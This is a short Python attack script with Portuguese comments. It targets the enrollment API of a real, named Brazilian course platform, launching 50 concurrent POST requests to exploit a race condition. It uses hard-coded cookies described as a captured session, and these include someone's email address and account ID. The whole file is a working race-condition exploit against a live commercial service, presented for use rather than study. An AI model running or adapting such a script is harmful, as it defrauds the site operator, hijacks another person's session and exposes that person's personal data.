import threading
import requests
import time

# Configurações da sessão capturada
COOKIES = {
    'EMP': 'di.s.hdei.fyb.ka.o.up%40gmail.com',
    'IDP': '5893505',
    'DCUP': '1763907127'
}

# Endpoint de matrícula (presumido baseado na análise de tráfego)
URL = "https://www.estrategiaconcursos.com.br/api/v1/enrollments/free"
COURSE_ID = 364593

def enroll_attempt(thread_id):
    payload = {"course_id": COURSE_ID}
    try:
        # Enviando requisição no exato momento para causar a Race Condition
        response = requests.post(URL, json=payload, cookies=COOKIES, timeout=5)
        print(f"[Thread {thread_id}] Status: {response.status_code} - {response.text[:50]}")
    except Exception as e:
        pass

def run_race():
    print(f"[*] Iniciando Race Condition no Curso ID: {COURSE_ID}")
    threads = []
    # Criando 50 threads para disparar simultaneamente
    for i in range(50):
        t = threading.Thread(target=enroll_attempt, args=(i,))
        threads.append(t)
    
    # Disparo em massa
    for t in threads:
        t.start()
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    run_race()
